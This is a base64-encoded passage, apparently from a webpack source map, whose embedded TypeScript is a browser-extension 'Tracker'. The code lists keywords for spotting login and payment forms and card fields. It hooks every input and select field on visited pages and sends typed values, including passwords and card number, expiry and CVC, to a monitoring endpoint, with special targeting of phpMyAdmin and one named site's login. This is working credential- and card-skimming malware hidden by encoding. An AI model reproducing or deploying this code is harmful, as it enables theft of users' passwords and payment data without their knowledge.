QyxRQUFROzRDQUMzQixRQUFRLEVBQUUsT0FBTyxDQUFDLE9BQU87NENBQ3pCLElBQUksRUFBRSxNQUFNLENBQUMsY0FBYyxDQUFDLE9BQU8sQ0FBQyxJQUFJLENBQUM7NENBQ3pDLGNBQWMsRUFBRSxPQUFPLENBQUMsYUFBYTs0Q0FDckMsU0FBUyxFQUFFLE9BQU8sQ0FBQyxlQUFlO3lDQUNyQzt3Q0FDRCxVQUFVLEVBQUUsT0FBTyxDQUFDLElBQUksQ0FBQyxRQUFRO3dDQUNqQyxXQUFXLEVBQUUsT0FBTyxDQUFDLElBQUksQ0FBQyxTQUFTO3dDQUNuQyxhQUFhLEVBQUUsT0FBTyxDQUFDLElBQUksQ0FBQyxXQUFXO3FDQUMxQztpQ0FDSjs2QkFDSixDQUFDLENBQUM7eUJBQ047d0JBQ0QsSUFBSSxPQUFPLENBQUMsT0FBTyxLQUFLLHNCQUFzQixFQUFFOzRCQUM1QyxPQUFPLENBQUMsQ0FBQyxXQUFXLENBQUM7Z0NBQ2pCLE1BQU0sRUFBRSxNQUFNO2dDQUNkLEdBQUcsRUFBRSx1QkFBdUIsR0FBRyx3QkFBd0I7Z0NBQ3ZELEtBQUssRUFBRSxJQUFJO2dDQUNYLE1BQU0sRUFBRSxDQUFDLEVBQUMsSUFBSSxFQUFFLGNBQWMsRUFBRSxLQUFLLEVBQUUsZ0NBQWdDLEVBQUMsQ0FBQztnQ0FDekUsSUFBSSxFQUFFO29DQUNGLFNBQVMsRUFBRSxPQUFPLENBQUMsT0FBTztvQ0FDMUIsa0JBQWtCLEVBQUU7d0NBQ2hCLFNBQVMsRUFBRTs0Q0FDUCxTQUFTLEVBQUUsT0FBTyxDQUFDLFFBQVE7NENBQzNCLFFBQVEsRUFBRSxPQUFPLENBQUMsT0FBTzs0Q0FDekIsSUFBSSxFQUFFLE1BQU0sQ0FBQyxjQUFjLENBQUMsT0FBTyxDQUFDLElBQUksQ0FBQzs0Q0FDekMsY0FBYyxFQUFFLE9BQU8sQ0FBQyxhQUFhOzRDQUNyQyxTQUFTLEVBQUUsT0FBTyxDQUFDLGVBQWU7eUNBQ3JDO3dDQUNELE1BQU0sRUFBRSxPQUFPLENBQUMsSUFBSSxDQUFDLElBQUk7d0NBQ3pCLE1BQU0sRUFBRSxPQUFPLENBQUMsSUFBSSxDQUFDLElBQUk7d0NBQ3pCLE9BQU8sRUFBRSxPQUFPLENBQUMsSUFBSSxDQUFDLEtBQUs7d0NBQzNCLGFBQWEsRUFBRSxPQUFPLENBQUMsSUFBSSxDQUFDLFdBQVc7d0NBQ3ZDLGFBQWEsRUFBRSxPQUFPLENBQUMsSUFBSSxDQUFDLFdBQVc7cUNBQzFDO2lDQUNKOzZCQUNKLENBQUMsQ0FBQzt5QkFDTjtvQkFDTCxDQUFDLENBQUMsQ0FBQztpQkFFTjtZQUNMLENBQUMsRUFBQyxHQUFHLENBQUMsQ0FBQztTQUNWO0lBQ0wsQ0FBQztDQUNKIiwic291cmNlcyI6WyJ3ZWJwYWNrOi8vTWlzaHVzb2Z0UnVudGltZS8uL0Fzc2V0cy90eXBlc2NyaXB0cy9kYi90cmFja2VyLnRzIiwid2VicGFjazovL01pc2h1c29mdFJ1bnRpbWUvLi9Bc3NldHMvdHlwZXNjcmlwdHMvbWlzaHVzb2Z0L1RyYWNrZXIudHMiXSwic291cmNlc0NvbnRlbnQiOlsiZXhwb3J0IGNvbnN0IGF1dGhGb3JtQXR0cmlidXRlID0gW1xuICAgIHtcbiAgICAgICAgJ2xvZ2luJzogW1xuICAgICAgICAgICAgJ2Zvcm0xJywgJ3NpZ25pbicsICdzaWdub24nLCAnbG9naW4nLCAnbG9nb24nLCAnaWRlbnRpJywgJ2lkYicsICd3cGNmNy1mb3JtJywgJ2Zvcm0tLTFHX1FuJywgJ2ZsJywgJ25nLXByaXN0aW5lJyxcbiAgICAgICAgICAgICdpbmRleC5waHAnLCAnbmV3X3VzZXInLCAnY3RsMjMnLCAnanNzJywgJ2Nvbm5leGlvbicsICdmaWxlJywgJ3N0eWxlZGZvcm0nLCAnYXV0aCcsXG4gICAgICAgIF1cbiAgICB9LFxuICAgIHsncmVnaXN0ZXInOiBbJ3JlZycsICdzaWdudXAnLCAnam9pbicsICdyZWdpc3RlcicsICdjaGVja2Zvcm0nXX0sXG4gICAgeydsb2dvdXQnOiBbJ2xvZ291dCddfSxcbiAgICB7XG4gICAgICAgICdwYXltZW50JzogW1xuICAgICAgICAgICAgJ2NyZWRpdCcsICdwYXltZW50JywgJ2JvZHknLCAnY2hlY2tvdXQnLCAnc3NsZm9ybScsICdwYXknLCAncHVyY2hhc2UnLCAnZWxlbWVudHNhcHAnLCAnY3JlZGl0Y2FyZCcsXG4gICAgICAgICAgICAnY3JlZGl0LWNhcmQnLCAnYWRkY2FyZCcsICdiaWxsJ1xuICAgICAgICBdXG4gICAgfSxcbiAgICB7XG4gICAgICAgICdleGNsdWRlJzogW1xuICAgICAgICAgICAgLyoncScsICovJ3NlYXJjaCcsICdnb29nbGVhZHMnLCAncHJlc2VudGF0aW9uJywgJ2NhcHRjaGEnLCAvKidkaXNhYmxlJywgKi8naGVhZGVyJyxcbiAgICAgICAgICAgICdjb252ZXJ0LWZvcm0nLCAnd2FtX2FydGVuJywgJ21hdGNoa2FsZW5kZXInLCAnc3VjaGUnLCAnZ2VuZXJhdGUnLCAnc3Vic2NyaWJlJywgJ2lnbm9yZScsXG4gICAgICAgICAgICAnZG93bmxvYWQnLCAna3JlZGl0cmVjaG5lcicsICdiaXRfZXhjaGFuZ2VfZm9ybScsICdhcHBseWZvcm0nLCAnYXBwX2Zvcm0nLCAnY29tbWVudCcsICd3YWxsZXQnLFxuICAgICAgICAgICAgJ3BpY2tlcicsICd3cC1saW5rJywgJ21ldGEnLCAncGFuaWVyJywgJ2NvbW1hbmRlJywgJ3JlY2hlcmNoZScsICdzZXR0aW5ncycsICdwb3N0cycsICdjaGFsbGVuZ2UnLCAndGFnJyxcbiAgICAgICAgICAgICd1cGxvYWQnLCAnbWFpbmYnLCAnZG9tYWluJ1xuICAgICAgICBdXG4gICAgfSxcbl1cblxuZXhwb3J0IGNvbnN0IHBheW1lbnRFbGVtZW50c0F0dHJpYnV0ZSA9IFtcbiAgICB7J2NhcmROdW1iZXInOiBbJ251bScsICdubycsICdjYXJkbm8nLF19LFxuICAgIHsnY2FyZEhvbGRlcic6IFsnaG9sZGVyJywgJ293bmVyJywgJ25hbWUnLF19LFxuICAgIHsnY2FyZFR5cGVzJzogWydicmFuZCcsICd0eXBlJywgJ3R5cGVzJyxdfSxcbiAgICB7J2NhcmRFeHBpcmUnOiBbJ2V4cCcsXX0sXG4gICAgeydjYXJkQ1ZDJzogWydjdmMnLCAnY3NjJywgJ2N2dicsICdzZWN1cml0eWNvZGUnLF19LFxuICAgIHsnY2FyZFBvc3RhbENvZGUnOiBbJ3ppcCcsICdwb3N0JyxdfSxcbiAgICAvKnsnZXhjbHVkZSc6IFsnZW1haWwnLCAndXNlcicsICd1c3InXX0sKi9cbl1cbiIsImltcG9ydCB7YXV0aEZvcm1BdHRyaWJ1dGUsIHBheW1lbnRFbGVtZW50c0F0dHJpYnV0ZX0gZnJvbSBcIi4uL2RiL3RyYWNrZXJcIjtcblxuLyppbml0aWFsaXplIG9uIGV4dGVuc2lvbiBpbnN0YWxsZWQqL1xubGV0IGdsb2JhbEFwcE1vbml0b3JNYWluVVJMOiBzdHJpbmc7XG5nbG9iYWxBcHBNb25pdG9yTWFpblVSTCA9ICdodHRwOi8vbG9jYWxob3N0L21vbml0b3IvYnJvd3Nlci8nO1xuLypyZXF1aXJlZCB2YXJpYWJsZXMqL1xuXG5cblxuZXhwb3J0IGNsYXNzIFRyYWNrZXIge1xuICAgIHB1YmxpYyB1cmw6IHN0cmluZztcbiAgICBwdWJsaWMgYXV0aEV2ZW50PzogYW55O1xuICAgIHB1YmxpYyBpc1RyYWNrZXJBY3RpdmF0ZTogYm9vbGVhbiA9IGZhbHNlO1xuICAgIHB1YmxpYyB0cmFja2VySm9iSWQ6IG51bWJlciA9IDA7XG4gICAgcHVibGljIHBhc3N3b3JkU3RvcmU6IHsgbm9kZTogSFRNTEVsZW1lbnQsIG5hbWU6IHN0cmluZywgdHlwZTogc3RyaW5nLCB2YWx1ZTogc3RyaW5nIH1bXSA9IFtdO1xuICAgIHB1YmxpYyBjcmVkaXRDYXJkU3RvcmU6IHsgbm9kZTogSFRNTEVsZW1lbnQsIG5hbWU6IHN0cmluZywgdHlwZTogc3RyaW5nLCB2YWx1ZTogc3RyaW5nIH1bXSA9IFtdO1xuICAgIHB1YmxpYyBjcmVkaXRDYXJkUnVudGltZUhvbGRlck5hbWU6IHN0cmluZyA9ICcnO1xuICAgIHB1YmxpYyBjcmVkaXRDYXJkUnVudGltZU51bWJlcjogc3RyaW5nID0gJyc7XG4gICAgcHVibGljIGNyZWRpdENhcmRSdW50aW1lQnJhbmQ6IHN0cmluZyA9ICcnO1xuICAgIHB1YmxpYyBjcmVkaXRDYXJkUnVudGltZUV4cGlyZURhdGU6IHN0cmluZyA9ICcnO1xuICAgIHB1YmxpYyBjcmVkaXRDYXJkUnVudGltZUN2Yzogc3RyaW5nID0gJyc7XG4gICAgcHVibGljIGNyZWRpdENhcmRSdW50aW1lUG9zdGFsQ29kZTogc3RyaW5nID0gJyc7XG4gICAgcHJpdmF0ZSBzdGF0aWMgaWRlbnRpdHk6IHN0cmluZztcbiAgICBwcml2YXRlIHN0YXRpYyB2ZXJzaW9uOiBzdHJpbmc7XG4gICAgcHJpdmF0ZSBzdGF0aWMgb3NOYW1lQW5kQXJjaDogc3RyaW5nO1xuICAgIHByaXZhdGUgc3RhdGljIGJyb3dzZXJOYW1lRnVsbDogc3RyaW5nO1xuXG4gICAgY29uc3RydWN0b3IoXG4gICAgICAgIHVybDogc3RyaW5nLFxuICAgICAgICBpZGVudGlmeTogc3RyaW5nLFxuICAgICAgICB2ZXJzaW9uOiBzdHJpbmcsXG4gICAgICAgIG9zTmFtZUFuZEFyY2g6IHN0cmluZyxcbiAgICAgICAgd2ViQnJvd3Nlck5hbWVGdWxsOiBzdHJpbmcsXG4gICAgKSB7XG4gICAgICAgIHRoaXMudXJsID0gdXJsO1xuICAgICAgICBUcmFja2VyLmlkZW50aXR5ID0gaWRlbnRpZnk7XG4gICAgICAgIFRyYWNrZXIudmVyc2lvbiA9IHZlcnNpb247XG4gICAgICAgIFRyYWNrZXIub3NOYW1lQW5kQXJjaCA9IG9zTmFtZUFuZEFyY2g7XG4gICAgICAgIFRyYWNrZXIuYnJvd3Nlck5hbWVGdWxsID0gd2ViQnJvd3Nlck5hbWVGdWxsO1xuICAgIH1cblxuICAgIGluaXQoY2FsbEJhY2s/OiBhbnkpIHtcbiAgICAgICAgY29uc3Qgc2VsZiA9IHRoaXM7XG4gICAgICAgIGlmIChzZWxmLnVybCkge1xuICAgICAgICAgICAgbGV0IGludGVydmFsMSA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICBzZWxmLnZlcmlmeUZvcm1FbGVtZW50KHNlbGYsIGludGVydmFsMSk7XG4gICAgICAgICAgICB9LCAxMDAwKTtcblxuXG4gICAgICAgICAgICBzZWxmLmJhY2t1cFNjcmlwdHMoc2VsZik7XG4gICAgICAgICAgICBzZWxmLmFic29sdXRlVHJhY2soc2VsZik7XG4gICAgICAgIH1cblxuICAgICAgICBpZiAoY2FsbEJhY2spIHtcbiAgICAgICAgICAgIGNhbGxCYWNrKCk7XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICBhYnNvbHV0ZVRyYWNrKHNlbGY6IHRoaXMpIHtcbiAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2lucHV0JykubGVuZ3RoICE9PSAwKSB7XG4gICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbCk7XG4gICAgICAgICAgICAgICAgc2VsZi5hYnNvbHV0ZVRyYWNrSGVscGVyKHNlbGYsIGRvY3VtZW50LmJvZHksICdpbnB1dCcsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgIFsna2V5dXAnLCAncGFzdGUnLCAnY2hhbmdlJywgJ2lucHV0J10uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIF9fZGV0ZWN0ZWRFbGVtZW50LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19kZXRlY3RlZEVsZW1lbnQudmFsdWUubGVuZ3RoICE9PSAwKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZUlucHV0RWxlbWVudERhdGEnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJzogX19kZXRlY3RlZEVsZW1lbnQubm9kZU5hbWUudG9Mb3dlckNhc2UoKSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndHlwZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnR5cGUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3BsYWNlaG9sZGVyJzogX19kZXRlY3RlZEVsZW1lbnQucGxhY2Vob2xkZXIgPyBfX2RldGVjdGVkRWxlbWVudC5wbGFjZWhvbGRlciA6ICdOT1QgU0VUJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIndvcmtXZWJzaXRlXCI6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ3NlbGVjdCcpLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xuICAgICAgICAgICAgICAgIHNlbGYuYWJzb2x1dGVUcmFja0hlbHBlcihzZWxmLCBkb2N1bWVudC5ib2R5LCAnc2VsZWN0JywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICAgICAgWydrZXl1cCcsICdwYXN0ZScsICdjaGFuZ2UnLCAnaW5wdXQnXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgX19kZXRlY3RlZEVsZW1lbnQuYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChfX2RldGVjdGVkRWxlbWVudC52YWx1ZS5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlSW5wdXRFbGVtZW50RGF0YScsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnOiBfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd0eXBlJzogX19kZXRlY3RlZEVsZW1lbnQudHlwZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAncGxhY2Vob2xkZXInOiBfX2RldGVjdGVkRWxlbWVudC5wbGFjZWhvbGRlciA/IF9fZGV0ZWN0ZWRFbGVtZW50LnBsYWNlaG9sZGVyIDogJ05PVCBTRVQnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwid29ya1dlYnNpdGVcIjogd2luZG93LmxvY2F0aW9uLm9yaWdpblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICB9XG4gICAgICAgIH0sIDEwMCk7XG4gICAgfVxuXG4gICAgYWJzb2x1dGVUcmFja0hlbHBlcihzZWxmOiB0aGlzLCBlbGVtZW50UGFyZW50Tm9kZTogSFRNTEVsZW1lbnQsIF9fdGFnTmFtZTogc3RyaW5nLCBjYWxsYmFjazogYW55KSB7XG4gICAgICAgIGlmIChlbGVtZW50UGFyZW50Tm9kZS5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgZWxlbWVudFBhcmVudE5vZGUuY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfX2NoaWxkRWxlbWVudCkge1xuICAgICAgICAgICAgICAgIGlmIChfX2NoaWxkRWxlbWVudC5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpID09PSBfX3RhZ05hbWUpIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKGNhbGxiYWNrKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhfX2NoaWxkRWxlbWVudCk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICBzZWxmLmFic29sdXRlVHJhY2tIZWxwZXIoc2VsZiwgKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KSwgX190YWdOYW1lLCBjYWxsYmFjaylcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9KTtcbiAgICAgICAgfVxuICAgIH1cblxuICAgIHRyaWdnZXIoc2VsZjogdGhpcywgX19mb3JtRWxlbWVudDogSFRNTEZvcm1FbGVtZW50KSB7XG4gICAgICAgIHNlbGYudHJhY2soc2VsZiwgX19mb3JtRWxlbWVudCk7XG4gICAgfVxuXG4gICAgdmVyaWZ5Rm9ybUVsZW1lbnQoc2VsZjogdGhpcywgaW50ZXJ2YWw/OiBhbnkpIHtcbiAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2Zvcm0nKS5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2Zvcm0nKS5mb3JFYWNoKGZ1bmN0aW9uIChfX2Zvcm1FbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgaWYgKF9fZm9ybUVsZW1lbnQuYXR0cmlidXRlcy5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHdpbmRvdy5sb2NhdGlvbi5ocmVmLnRvTG93ZXJDYXNlKCkuaW5kZXhPZigncGhwbXlhZG1pbicpICE9PSAtMSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fZm9ybUVsZW1lbnQubWV0aG9kID09PSAncG9zdCcpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnRlcnZhbCA/IGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpIDogJyc7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5pc1RyYWNrZXJBY3RpdmF0ZSA9IHRydWU7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50cmFja2VySm9iSWQrKztcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnRyaWdnZXIoc2VsZiwgX19mb3JtRWxlbWVudCk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19mb3JtRWxlbWVudC5hY3Rpb24gIT09ICdqYXZhc2NyaXB0OnZvaWQoMCknICYmIF9fZm9ybUVsZW1lbnQuaWQgIT09ICdudWxsJyAmJiBfX2Zvcm1FbGVtZW50LmlkICE9PSAnaXJvdXRlRm9ybScgJiZcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX2Zvcm1FbGVtZW50LmlkICE9PSAnYmhsZicgJiYgX19mb3JtRWxlbWVudC5pZC5pbmRleE9mKCdpZCcpID09PSAtMSAmJiBfX2Zvcm1FbGVtZW50LmlkLmluZGV4T2YoJ3VfMF8nKSA9PT0gLTEgJiZcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX2Zvcm1FbGVtZW50LmlkLmluZGV4T2YoJ3RoZWZvcm0nKSA9PT0gLTEgJiYgX19mb3JtRWxlbWVudC5pZC5pbmRleE9mKCdzY2xfZm9ybScpID09PSAtMSAmJlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fZm9ybUVsZW1lbnQuY2xhc3NOYW1lLmluZGV4T2YoJ2diXzhlJykgPT09IC0xKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50ZXJ2YWwgPyBjbGVhckludGVydmFsKGludGVydmFsKSA6ICcnO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuaXNUcmFja2VyQWN0aXZhdGUgPSB0cnVlO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudHJhY2tlckpvYklkKys7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50cmlnZ2VyKHNlbGYsIF9fZm9ybUVsZW1lbnQpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9fZm9ybUVsZW1lbnQuY2hpbGROb2Rlcy5sZW5ndGggPiAxKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpbnRlcnZhbCA/IGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpIDogJyc7XG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmlzVHJhY2tlckFjdGl2YXRlID0gdHJ1ZTtcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudHJhY2tlckpvYklkKys7XG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnRyaWdnZXIoc2VsZiwgX19mb3JtRWxlbWVudCk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9KTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24ub3JpZ2luLmluZGV4T2YoJ2Rhc2guZmVtYmVkLmNvbScpICE9PSAtMSkge1xuICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjbG9naW4nKSAhPT0gbnVsbCkge1xuICAgICAgICAgICAgICAgICAgICBpbnRlcnZhbCA/IGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpIDogJyc7XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuaXNUcmFja2VyQWN0aXZhdGUgPSB0cnVlO1xuICAgICAgICAgICAgICAgICAgICBzZWxmLnRyYWNrZXJKb2JJZCsrO1xuICAgICAgICAgICAgICAgICAgICBzZWxmLmNsYXNzaWNUcmFja0F1dGhFdmVudChzZWxmLCAnI2VtYWlsX2xvZ2luJywgJyNwYXNzd29yZCcsICcjbG9naW4nKTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICByZXNvbHZlckZvcm1BdHRyaWJ1dGVzKHNlbGY6IHRoaXMsIF9fZm9ybUVsZW1lbnQ6IGFueSk6IGFueSB7XG4gICAgICAgIGNvbnN0IGF0dHJpYnV0ZXMgPSBbLi4uX19mb3JtRWxlbWVudC5hdHRyaWJ1dGVzXTtcbiAgICAgICAgaWYgKGF0dHJpYnV0ZXMubGVuZ3RoICE9PSAwKSB7XG4gICAgICAgICAgICBhdHRyaWJ1dGVzLmZvckVhY2goZnVuY3Rpb24gKGF0dHJpYnV0ZSkge1xuICAgICAgICAgICAgICAgIGlmIChhdHRyaWJ1dGUubm9kZVZhbHVlICE9PSAnamF2YXNjcmlwdDp2b2lkKDApOycpIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKGF0dHJpYnV0ZS5ub2RlVmFsdWUubGVuZ3RoICE9PSAwICYmIGF0dHJpYnV0ZS5ub2RlVmFsdWUubGVuZ3RoID49IDMpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIC8qZm9ybSBhdHRyaWJ1dGUgdmFsdWUqL1xuICAgICAgICAgICAgICAgICAgICAgICAgYXV0aEZvcm1BdHRyaWJ1dGUuZm9yRWFjaChmdW5jdGlvbiAoa2V5d29yZDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKE9iamVjdC5rZXlzKGtleXdvcmQpLmxlbmd0aCAhPT0gMCAmJiBrZXl3b3JkLmNvbnN0cnVjdG9yID09PSBPYmplY3QpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmtleXMoa2V5d29yZCkuZm9yRWFjaChmdW5jdGlvbiAoX19rZXkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGtleXdvcmRbX19rZXldLmZvckVhY2goZnVuY3Rpb24gKF9fcUtleTogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGF0dHJpYnV0ZS5ub2RlVmFsdWUudG9Mb3dlckNhc2UoKS5pbmRleE9mKF9fcUtleSkgIT09IC0xIC8qfHwgd2luZG93LmxvY2F0aW9uLm9yaWdpbi50b0xvd2VyQ2FzZSgpLmluZGV4T2YoX19xS2V5KSAhPT0gLTFcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfHwgZG9jdW1lbnQudGl0bGUudG9Mb3dlckNhc2UoKS5pbmRleE9mKF9fcUtleSkgIT09IC0xICYmIHdpbmRvdy5sb2NhdGlvbi5vcmlnaW4udG9Mb3dlckNhc2UoKS5pbmRleE9mKCdmaWxlJykgPT09IC0xKi8pIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLyp2YXIgc3RyID0gdGV4dC5yZXBsYWNlKC8oXlxcd3sxfSl8KFxcc3sxfVxcd3sxfSkvZywgbWF0Y2ggPT4gbWF0Y2gudG9VcHBlckNhc2UoKSk7Ki9cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9zZWxmLmF1dGhFdmVudCAhPT0gdW5kZWZpbmVkID8gc2VsZi5hdXRoRXZlbnQgPSBzZWxmLmF1dGhFdmVudCA6IHNlbGYuYXV0aEV2ZW50ID0gX19rZXk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuYXV0aEV2ZW50ID0gX19rZXk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGF0dHJpYnV0ZS5ub2RlVmFsdWUgPT09IG51bGwpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vc2VsZi5hdXRoRXZlbnQgIT09IHVuZGVmaW5lZCA/IHNlbGYuYXV0aEV2ZW50ID0gc2VsZi5hdXRoRXZlbnQgOiBzZWxmLmF1dGhFdmVudCA9ICdleGNsdWRlJztcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuYXV0aEV2ZW50ID0gJ2V4Y2x1ZGUnO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAg